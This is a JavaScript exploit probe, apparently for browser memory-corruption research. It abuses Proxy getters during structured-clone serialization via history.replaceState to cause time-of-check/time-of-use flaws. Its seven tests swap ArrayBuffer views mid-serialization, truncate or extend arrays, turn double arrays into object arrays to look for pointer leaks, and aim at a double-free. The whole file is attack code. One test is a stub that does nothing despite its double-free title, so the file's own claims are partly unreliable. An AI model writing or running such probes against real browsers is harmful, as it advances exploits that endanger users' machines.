// SC TOCTOU probe — abuse Proxy getters during structured clone serialization
// When the SC serializer reads a Proxy, our getter code runs mid-serialization.
// We use this to modify unvisited parts of the object graph, causing inconsistency.
(function() {
'use strict';

var results = { tests: [] };

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

function hexDump(view, off, len) {
  var h = '';
  for (var i = off; i < Math.min(off + len, view.length); i++)
    h += view[i].toString(16).padStart(2, '0');
  return h;
}

// ─── Test 1: Can Proxy objects be structured-cloned at all? ───
test('proxy_sc_basic', function() {
  var accessLog = [];
  var p = new Proxy({ x: 42, y: 'hello' }, {
    get: function(t, prop) {
      accessLog.push(String(prop));
      return t[prop];
    },
    ownKeys: function(t) {
      accessLog.push('ownKeys');
      return Object.keys(t);
    },
    getOwnPropertyDescriptor: function(t, prop) {
      accessLog.push('desc:' + prop);
      return Object.getOwnPropertyDescriptor(t, prop);
    }
  });

  try {
    history.replaceState({ data: p }, '');
    var c = history.state;
    history.replaceState(null, '');
    return {
      result: 'cloned',
      x: c ? c.data.x : null,
      y: c ? c.data.y : null,
      accesses: accessLog.slice(0, 20)
    };
  } catch(e) {
    return { result: 'error', msg: e.message, accesses: accessLog.slice(0, 20) };
  }
});

// ─── Test 2: Proxy getter modifies a later array element during SC ───
test('toctou_array_swap', function() {
  var bigBuf = new ArrayBuffer(256);
  new Uint8Array(bigBuf).fill(0xBB);
  var bigView = new Uint8Array(bigBuf);

  var smallBuf = new ArrayBuffer(16);
  new Uint8Array(smallBuf).fill(0xAA);

  var triggered = false;
  var arr = [];

  // arr[0] = Proxy that modifies arr[2] when serialized
  arr[0] = new Proxy({ val: 1 }, {
    get: function(t, p) {
      if (!triggered && (p === 'val' || p === Symbol.toPrimitive)) {
        triggered = true;
        // Swap arr[2] from bigView to smallView during serialization
        arr[2] = new Uint8Array(smallBuf);
      }
      return t[p];
    },
    ownKeys: function(t) { return Object.keys(t); },
    getOwnPropertyDescriptor: function(t, p) {
      return Object.getOwnPropertyDescriptor(t, p);
    }
  });
  arr[1] = bigBuf; // serialized first, gets pool index P
  arr[2] = bigView; // originally big, swapped to small by Proxy getter

  try {
    history.replaceState(arr, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null_state' };

    // Check what c[2] is
    var item = c[2];
    if (!item) return { result: 'null_item', triggered: triggered };
    if (item instanceof Uint8Array) {
      return {
        result: item[0] === 0xAA ? 'SWAPPED_TO_SMALL' : (item[0] === 0xBB ? 'kept_big' : 'unexpected'),
        len: item.length,
        bufLen: item.buffer.byteLength,
        byte0: item[0],
        triggered: triggered
      };
    }
    return { result: 'wrong_type', type: typeof item, ctor: item.constructor ? item.constructor.name : '?' };
  } catch(e) {
    return { result: 'error', msg: e.message, triggered: triggered };
  }
});

// ─── Test 3: Proxy modifies array length during serialization ───
test('toctou_length_change', function() {
  var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
  var longArr = new Array(100);
  for (var i = 0; i < 100; i++) longArr[i] = i + 0.5;

  var triggered = false;
  var container = {};

  container.trigger = new Proxy({ v: 1 }, {
    get: function(t, p) {
      if (!triggered) {
        triggered = true;
        // Truncate arr after serializer might have cached its length
        arr.length = 2;
        // Or extend it with objects
        for (var i = 2; i < 20; i++) arr.push({ ptr: i });
      }
      return t[p];
    },
    ownKeys: function(t) { return Object.keys(t); },
    getOwnPropertyDescriptor: function(t, p) {
      return Object.getOwnPropertyDescriptor(t, p);
    }
  });
  container.data = arr;

  try {
    history.replaceState(container, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null' };
    return {
      result: 'len_test',
      clonedLen: c.data ? c.data.length : -1,
      types: c.data ? c.data.slice(0, 5).map(function(v) { return typeof v; }) : [],
      triggered: triggered
    };
  } catch(e) {
    return { result: 'error', msg: e.message, triggered: triggered };
  }
});

// ─── Test 4: Proxy replaces ArrayBuffer backing store mid-serialize ───
// Goal: serializer reads buffer A's size, then we swap to buffer B (different size),
// serializer writes buffer B's data with buffer A's size metadata
test('toctou_buffer_swap', function() {
  var bigBuf = new ArrayBuffer(256);
  new Uint8Array(bigBuf).fill(0xCC);

  var tinyBuf = new ArrayBuffer(16);
  new Uint8Array(tinyBuf).fill(0xDD);

  var swapped = false;
  var holder = [null, null];

  holder[0] = new Proxy({ x: 1 }, {
    get: function(t, p) {
      if (!swapped) {
        swapped = true;
        // Replace the view in holder[1] with a view of tinyBuf
        holder[1] = new Uint8Array(tinyBuf);
      }
      return t[p];
    },
    ownKeys: function(t) { return Object.keys(t); },
    getOwnPropertyDescriptor: function(t, p) {
      return Object.getOwnPropertyDescriptor(t, p);
    }
  });
  holder[1] = new Uint8Array(bigBuf);

  try {
    history.replaceState(holder, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null' };

    var v = c[1];
    if (!v) return { result: 'null_view', swapped: swapped };
    if (v instanceof Uint8Array) {
      return {
        result: 'got_view',
        len: v.length,
        bufLen: v.buffer.byteLength,
        byte0: v[0],
        swapped: swapped,
        isTiny: v.buffer.byteLength === 16,
        isBig: v.buffer.byteLength === 256
      };
    }
    return { result: 'wrong_type', type: typeof v };
  } catch(e) {
    return { result: 'error', msg: e.message, swapped: swapped };
  }
});

// ─── Test 5: Proxy converts double array to object array during SC ───
// This is the classic TOCTOU: serializer starts reading doubles, we convert to objects
test('toctou_double_to_obj', function() {
  // Create a proper double array
  var doubles = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];

  var proxyFired = false;
  var trigger = new Proxy({ v: 1 }, {
    get: function(t, p) {
      if (!proxyFired) {
        proxyFired = true;
        // Convert doubles array to have objects — changes internal storage
        var leaked = { LEAKED: true };
        doubles[0] = leaked;
        doubles[1] = leaked;
        doubles[4] = { PTR: 0xDEAD };
      }
      return t[p];
    },
    ownKeys: function(t) { return Object.keys(t); },
    getOwnPropertyDescriptor: function(t, p) {
      return Object.getOwnPropertyDescriptor(t, p);
    }
  });

  var data = [trigger, doubles];

  try {
    history.replaceState(data, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null' };

    var cloned = c[1];
    if (!cloned) return { result: 'null_arr' };

    var info = { types: [], vals: [] };
    for (var i = 0; i < cloned.length; i++) {
      info.types.push(typeof cloned[i]);
      if (typeof cloned[i] === 'number') {
        info.vals.push(f64ToHex(cloned[i]));
      } else if (typeof cloned[i] === 'object' && cloned[i]) {
        info.vals.push(JSON.stringify(cloned[i]).substring(0, 40));
      } else {
        info.vals.push(String(cloned[i]));
      }
    }

    // Check if any elements look like leaked pointers
    var leaks = [];
    for (var i = 0; i < cloned.length; i++) {
      if (typeof cloned[i] === 'number') {
        var hex = f64ToHex(cloned[i]);
        // Non-standard double values might be pointer leaks
        if (hex !== '0x3ff199999999999a' && // 1.1
            hex !== '0x400199999999999a' && // 2.2
            hex !== '0x400a666666666666' && // 3.3
            hex !== '0x401199999999999a' && // 4.4
            hex !== '0x4016000000000000' && // 5.5
            hex !== '0x401a666666666666' && // 6.6
            hex !== '0x401ecccccccccccd' && // 7.7
            hex !== '0x4020000000000000' && // 8.0
            hex !== '0x4021999999999999' && // 8.8 approx
            hex !== '0x0000000000000000') {
          leaks.push({ idx: i, hex: hex, val: cloned[i] });
        }
      }
    }

    return {
      result: leaks.length > 0 ? 'POINTER_LEAK' : (proxyFired ? 'modified_but_clean' : 'proxy_didnt_fire'),
      fired: proxyFired,
      len: cloned.length,
      info: info,
      leaks: leaks
    };
  } catch(e) {
    return { result: 'error', msg: e.message, fired: proxyFired };
  }
});

// ─── Test 6: Proxy-based Getter on Array indices (bypass SC iteration) ───
test('proxy_array_direct', function() {
  var objToLeak = { secret: 42 };
  var callCount = 0;

  // Create a Proxy that acts like an array but returns different types
  var fakeArr = new Proxy([], {
    get: function(t, p) {
      if (p === 'length') return 4;
      if (p === '0') return 1.1;
      if (p === '1') return 2.2;
      if (p === '2') {
        callCount++;
        // First call might be type check, second the actual read
        // Return double on first call, object on second
        if (callCount <= 1) return 3.3;
        return objToLeak;
      }
      if (p === '3') return 4.4;
      return t[p];
    }
  });

  try {
    history.replaceState(fakeArr, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null' };

    var info = [];
    for (var i = 0; i < c.length; i++) {
      info.push({ idx: i, type: typeof c[i], val: typeof c[i] === 'number' ? f64ToHex(c[i]) : String(c[i]).substring(0, 30) });
    }

    return {
      result: 'proxy_array_test',
      callCount: callCount,
      len: c.length,
      items: info
    };
  } catch(e) {
    return { result: 'error', msg: e.message, callCount: callCount };
  }
});

// ─── Test 7: During SC, swap a shared ArrayBuffer ref to cause double-free ───
test('toctou_ref_swap', function() {
  var buf1 = new ArrayBuffer(64);
  new Uint8Array(buf1).fill(0x11);
  var buf2 = new ArrayBuffer(64);
  new Uint8Array(buf2).fill(0x22);

  var view1 = new Uint8Array(buf1);
  var viewRef = { v: new Uint8Array(buf1) }; // Another view of buf1

  var swapped = false;
  var trigger = new Proxy({ x: 1 }, {
    get: function(t, p) {
      if (!swapped) {
        swapped = true;
        // Replace the referenced view's buffer
        // viewRef.v is already serialized (hopefully), but let's try
        // modifying the ORIGINAL view1 won't help since it's already serialized
        // Instead, try to confuse by adding to the SC object pool
      }
      return t[p];
    },
    ownKeys: function(t) { return Object.keys(t); },
    getOwnPropertyDescriptor: function(t, p) {
      return Object.getOwnPropertyDescriptor(t, p);
    }
  });

  // The SC should serialize: trigger, view1 (serializes buf1 inline),
  // viewRef.v (back-ref to buf1)
  var data = [trigger, view1, viewRef];

  try {
    history.replaceState(data, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null' };

    // Check if c[1] and c[2].v share the same buffer
    var v1 = c[1];
    var v2 = c[2] ? c[2].v : null;

    return {
      result: 'ref_test',
      v1_byte0: v1 instanceof Uint8Array ? v1[0] : null,
      v2_byte0: v2 instanceof Uint8Array ? v2[0] : null,
      shared: v1 instanceof Uint8Array && v2 instanceof Uint8Array ? v1.buffer === v2.buffer : null,
      swapped: swapped
    };
  } catch(e) {
    return { result: 'error', msg: e.message, swapped: swapped };
  }
});

return JSON.stringify(results);
})();
